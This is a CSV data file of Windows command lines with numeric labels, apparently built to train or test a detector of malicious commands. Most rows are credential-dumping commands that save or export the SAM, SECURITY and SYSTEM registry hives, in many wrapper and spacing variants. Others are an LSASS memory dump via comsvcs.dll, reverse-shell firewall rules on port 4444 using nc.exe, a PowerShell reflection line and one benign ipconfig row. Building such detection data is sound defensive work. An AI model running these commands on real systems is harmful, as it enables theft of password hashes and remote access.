text,label
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\2agr7q73.dat""""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\ss5beabf.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\m5erujrc.dat""",1
reg export hklm\security c:\windows\temp\gh6k7h8s.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\osjfk2ky.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\h9eg7px0.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\89z9a4xq.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\e021rxib.dat""""",1
reg save hklm\sam c:\windows\temp\x0sud8pd.save,1
reg save hklm\system c:\windows\temp\eoc8d9yf.save,1
reg export hklm\security c:\windows\temp\7k7l6q18.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\52529m4w.dat""",1
reg save hklm\security c:\windows\temp\j1ftmm20.save,1
reg save hklm\sam c:\windows\temp\gi3uzj48.save,1
reg save hklm\security c:\windows\temp\t6whv6mw.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8m2wm6vv.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\uyah90zk.dat""",1
reg export hklm\system c:\windows\temp\qiy1w5yu.save,1
reg save hklm\security c:\windows\temp\65dd76ei.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\6r02rr7x.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rr75pvvb.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\rf50jn78.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7uuec77m.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\ycumm8kl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\02yxmxu6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6d5jfpjx.dat""",1
reg export hklm\sam c:\windows\temp\81e6xwqa.save,1
reg save hklm\system c:\windows\temp\8yb8nw4s.save,1
reg export hklm\security c:\windows\temp\v5feos0g.save,1
reg  export  hklm\sam  c:\windows\temp\1js2td53.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\security c:\temp\mwom6nsq.dat""""",1
reg save hklm\system c:\windows\temp\al0t8y4o.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\mu7c84ft.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6lxoeg06.dat""",1
reg export hklm\security c:\windows\temp\p3849tbt.save,1
reg export hklm\system c:\windows\temp\9w5zlslo.save,1
reg   export   hklm\sam   c:\windows\temp\qbjh87mc.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\t9effpbv.dat""",1
reg save hklm\sam c:\windows\temp\77ogk90u.save,1
reg  save  hklm\sam  c:\windows\temp\bobpbtto.save,1
reg export hklm\system c:\windows\temp\3lra96pu.save,1
reg export hklm\system c:\windows\temp\0j81c8wr.save,1
reg save hklm\system c:\windows\temp\pqakappb.save,1
reg export hklm\system c:\windows\temp\pdjvderb.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\i7ie31pg.dat""",1
"cmd.exe /c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\security c:\windows\temp\ivp2c0cb.save,1
"cmd.exe /c ""reg   save   hklm\system   c:\windows\temp\epmdi8ts.save""",1
reg save hklm\security c:\windows\temp\b9vabkzy.save,1
reg export hklm\sam c:\windows\temp\zkoezsy2.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\irvryvo8.dat""",1
reg save hklm\system c:\windows\temp\w9m8jxxr.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\b1owuaue.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\lxfvrean.dat""",1
reg export hklm\security c:\windows\temp\qr89upyx.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\bv51lpdm.dat""",1
reg save hklm\sam c:\windows\temp\8nzzqw0b.save,1
reg save hklm\security c:\windows\temp\kv3n1prh.save,1
reg export hklm\system c:\windows\temp\hvqg3f2b.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\qank8z3p.dat""",1
reg export hklm\system c:\windows\temp\84ejoq91.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\8ho2kbv8.dat""",1
reg save hklm\security c:\windows\temp\fijggbc8.save,1
reg save hklm\sam c:\windows\temp\kaepxp4y.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\1774a1kb.dat""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\3mup2c6k.dat""""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"powershell -nop -c ""reg save hklm\sam c:\temp\fe1pwaxm.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wlmfdgop.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg save hklm\security c:\temp\ibbut7tu.dat""""",1
reg export hklm\sam c:\windows\temp\wucx9w44.save,1
reg save hklm\system c:\windows\temp\sy18rhqh.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\unjcdb10.dat""",1
reg export hklm\sam c:\windows\temp\sqjzuxkq.save,1
reg export hklm\system c:\windows\temp\l4wludvi.save,1
reg   export   hklm\security   c:\windows\temp\yqrtopzj.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\7tgwu5qa.dat""",1
reg export hklm\sam c:\windows\temp\csw0smo5.save,1
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\u7zpx417.dat""""",1
reg save hklm\system c:\windows\temp\9ayfantc.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\kyyb3cb5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\pnglwhkl.dat""",1
reg export hklm\system c:\windows\temp\nzrg9b9i.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2kz8lc4z.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\pctauyua.dat""",1
reg export hklm\system c:\windows\temp\ya9xxwcg.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\j6y6rs6q.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\15776wne.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\i6emba8v.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\dox5avnh.dat""",1
reg export hklm\system c:\windows\temp\0h6owxje.save,1
reg save hklm\security c:\windows\temp\2at2x5g5.save,1
reg save hklm\security c:\windows\temp\2sndmapj.save,1
reg save hklm\system c:\windows\temp\s3ol6fl4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\64hcef4y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xdwr3uso.dat""",1
reg save hklm\security c:\windows\temp\szqak61a.save,1
reg export hklm\system c:\windows\temp\ejactfj0.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\eh66jo4c.dat""",1
"cmd.exe /c ""cmd.exe /c ""reg export hklm\security c:\temp\o06h6gn9.dat""""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8rq3jwk1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\45me4n7c.dat""",1
reg save hklm\sam c:\windows\temp\50zfmtwh.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\uuwoyxd3.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\8svu67mq.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\868nv7yz.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\b6pzyf3k.dat""",1
reg save hklm\system c:\windows\temp\anbwel9n.save,1
reg save hklm\security c:\windows\temp\5omn3xkx.save,1
reg export hklm\sam c:\windows\temp\fk6d8k26.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\g3p075fh.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\neaqvkgj.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\7mp6n969.dat""",1
reg export hklm\system c:\windows\temp\ufq8flyi.save,1
reg export hklm\sam c:\windows\temp\29mol2oz.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7lmu16h9.dat""",1
reg export hklm\security c:\windows\temp\4ls4pu0p.save,1
reg save hklm\sam c:\windows\temp\1icajqgw.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\kf2k44xp.dat""",1
"cmd.exe /c ""reg save hklm\security c:\windows\temp\ui0sn95r.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\519vky92.dat""",1
reg export hklm\security c:\windows\temp\wfk1c4j0.save,1
reg export hklm\system c:\windows\temp\tfm5zsmt.save,1
reg save hklm\system c:\windows\temp\dvwlvu0s.save,1
reg export hklm\system c:\windows\temp\f4vrwfx3.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\60jcg2f8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\1pef38vl.dat""",1
reg   save   hklm\security   c:\windows\temp\3ed7fh0q.save,1
reg export hklm\security c:\windows\temp\ddjbsp9x.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\9brj0r0t.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\ufns13g3.dat""",1
reg export hklm\security c:\windows\temp\do03nn9d.save,1
reg export hklm\system c:\windows\temp\o4g6qm3g.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\dukk7qko.dat""""",1
reg save hklm\system c:\windows\temp\qoenzf7a.save,1
reg export hklm\security c:\windows\temp\qtip5p97.save,1
reg save hklm\security c:\windows\temp\c45ejgos.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\uosctir0.dat""",1
reg save hklm\sam c:\windows\temp\98ogq8sd.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\pmxc860x.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\7gz0orec.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\tujwnwsp.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\6c6f8e62.dat""",1
"cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\md3613dk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\ln5lr2fp.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\0duhjgpw.dat""",1
reg export hklm\system c:\windows\temp\dw66o8vk.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\po0t1w59.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\n6dai3ob.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\9gaiijxm.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\onfez8ey.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\h82d704r.dat""",1
reg save hklm\system c:\windows\temp\h7tk8i24.save,1
reg save hklm\system c:\windows\temp\a6hs5woi.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\to7sn249.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\gnhmhm5f.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ju1llheu.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\1hfytmm1.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\p57v393b.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\4m4bl7b4.dat""",1
reg export hklm\security c:\windows\temp\dy3kk6qx.save,1
reg save hklm\security c:\windows\temp\x8wuj7pr.save,1
reg save hklm\security c:\windows\temp\ofwxqkl4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8cle5ocn.dat""",1
reg save hklm\system c:\windows\temp\a3ev00qd.save,1
reg   export   hklm\sam   c:\windows\temp\hgnmm8rt.save,1
reg export hklm\sam c:\windows\temp\2dhgymlr.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jg1kojsd.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\desq05cu.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\8nbhiznc.dat""",1
reg save hklm\security c:\windows\temp\yelb6e7y.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\9ixp5n6x.save""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\lyvt6ukz.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xpxacek9.dat""",1
reg export hklm\sam c:\windows\temp\vylj9m91.save,1
reg save hklm\system c:\windows\temp\9s9yix0i.save,1
reg save hklm\security c:\windows\temp\9zdrecnv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\vmoavicl.dat""",1
reg save hklm\sam c:\windows\temp\cut7f4cw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\wwaqackb.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\uuactss3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\167y1zaa.dat""",1
"powershell -nop -c ""ipconfig /all""",0
reg export hklm\security c:\windows\temp\80g75r2r.save,1
reg export hklm\sam c:\windows\temp\bhnbw266.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\rmr2eh91.dat""",1
reg export hklm\security c:\windows\temp\z1aoy0pe.save,1
reg save hklm\sam c:\windows\temp\soqvgrbd.save,1
reg save hklm\security c:\windows\temp\methvarg.save,1
"rundll32.exe   c:\windows\system32\comsvcs.dll,   minidump   1234   c:\temp\lsass.dmp   full",1
"powershell -nop -c ""reg export hklm\sam c:\temp\h5y7ye6o.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\p2yj3qqk.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\fmpt4ny7.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\hkjvfk9u.dat""",1
reg save hklm\security c:\windows\temp\ylhk6hcs.save,1
reg save hklm\sam c:\windows\temp\tpweljdx.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\lwv0v9j5.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\txkokvu2.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\w6shjv9a.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\l22z4tjn.dat""",1
reg save hklm\sam c:\windows\temp\1i5q36hy.save,1
reg save hklm\security c:\windows\temp\t1vg50x8.save,1
reg export hklm\sam c:\windows\temp\7q2ua0ta.save,1
reg export hklm\system c:\windows\temp\kiyupvvd.save,1
reg export hklm\system c:\windows\temp\4xinht30.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\o569v2wo.save""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\djopdido.dat""",1
reg export hklm\security c:\windows\temp\kqv5caag.save,1
reg export hklm\system c:\windows\temp\sm5qwzf0.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\udlyslta.dat""",1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\b181n2i8.save""",1
reg save hklm\sam c:\windows\temp\q0eetrqt.save,1
reg save hklm\system c:\windows\temp\s08bvike.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\h34jil4r.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\kj95puqq.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\vslm8f0b.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\ae8y7zn9.dat""",1
reg save hklm\system c:\windows\temp\j658l5un.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\owlu0367.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\5nxvzqos.dat""",1
reg save hklm\security c:\windows\temp\mmesqn04.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\modllaxf.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\hlkjt8xe.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\od8q3vef.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\wfcu5g0y.dat""",1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\6w3o3osf.save""",1
reg export hklm\system c:\windows\temp\yh15bzzn.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\lxi22ix6.save""",1
reg save hklm\system c:\windows\temp\5pnf5t38.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\tbcclf3i.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\uge271ap.dat""",1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\tnpx75kw.save""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\irgabf3p.dat""",1
reg export hklm\sam c:\windows\temp\1m531n20.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\edzvk1d0.dat""""",1
reg save hklm\sam c:\windows\temp\tvudlkcr.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\gr2kukfl.dat""",1
reg export hklm\system c:\windows\temp\dhliycuq.save,1
reg export hklm\sam c:\windows\temp\bytt5fzm.save,1
reg export hklm\system c:\windows\temp\yspxgzqr.save,1
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\3k6hrn9l.dat""""",1
reg save hklm\system c:\windows\temp\uj38g68g.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\pt2igtxt.dat""",1
reg save hklm\security c:\windows\temp\ar6epdub.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\4ll8slsf.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9u6xziww.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rcyrlmds.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\6g4cjub6.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\rswzdwwr.dat""""",1
reg save hklm\sam c:\windows\temp\zmmqdsh0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ga7b3mnt.dat""",1
reg save hklm\sam c:\windows\temp\86o055pz.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\6r9s755d.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\tbcipt5w.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\95ta6ppa.dat""",1
reg export hklm\security c:\windows\temp\ap01m2ki.save,1
reg export hklm\security c:\windows\temp\uw1i7bwo.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\security c:\windows\temp\2u0hfoap.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2uh4le66.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\xtcvy6og.dat""",1
reg export hklm\security c:\windows\temp\85yajg2j.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\x6zexc2c.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\rnhharwj.dat""",1
reg save hklm\sam c:\windows\temp\pdm93k0n.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\yjwgxy24.dat""",1
reg export hklm\sam c:\windows\temp\v47lukex.save,1
reg export hklm\system c:\windows\temp\v4dtqpuy.save,1
reg save hklm\system c:\windows\temp\9pgd0rv2.save,1
reg save hklm\sam c:\windows\temp\jvnwc14s.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\cw62gjh2.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\lg9cnfp5.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\w057mkds.save""",1
reg export hklm\security c:\windows\temp\3nzcktry.save,1
reg save hklm\security c:\windows\temp\d8ol8lpl.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\p5j6bzkf.dat""",1
reg export hklm\system c:\windows\temp\qhh12zzh.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\bc8vbv8c.dat""""",1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\gub2o9rn.dat""",1
reg export hklm\security c:\windows\temp\6kmerssh.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\d54cj4cz.dat""",1
reg   export   hklm\security   c:\windows\temp\ik7d0d30.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\thfk7oxs.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3wmlocmh.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\gubkus6y.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\uinnyuu6.dat""",1
"powershell -nop -c ""reg   save   hklm\security   c:\windows\temp\xwycjuag.save""",1
reg save hklm\system c:\windows\temp\13s3ovl3.save,1
reg save hklm\security c:\windows\temp\vdypq83s.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\7xv6m8h3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\lya944z1.dat""",1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\1v3n4x0i.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\db98pg0r.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\xxoa5h53.dat""",1
reg save hklm\system c:\windows\temp\muuxt87i.save,1
"cmd.exe /c ""reg   save   hklm\sam   c:\windows\temp\r71ae79w.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\l0ai0pvx.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\h4ecr8m3.dat""""",1
reg save hklm\sam c:\windows\temp\f11zl9ng.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\13ir87v6.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\0civdfci.dat""",1
reg save hklm\security c:\windows\temp\8ncovu56.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\zvpg2se9.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\qx06zyf7.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\sbhalxwe.dat""",1
reg export hklm\system c:\windows\temp\fxsx4k83.save,1
reg save hklm\system c:\windows\temp\65tpk71r.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\xluin3d3.save""",1
reg export hklm\security c:\windows\temp\wmp46034.save,1
reg save hklm\system c:\windows\temp\vwteget4.save,1
reg save hklm\sam c:\windows\temp\ejbe02mc.save,1
reg save hklm\system c:\windows\temp\9nn6x41z.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\4cartqea.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\qlqmnjgk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\tm56kezc.dat""",1
reg export hklm\system c:\windows\temp\q6psf6ho.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ikoxe1h0.dat""",1
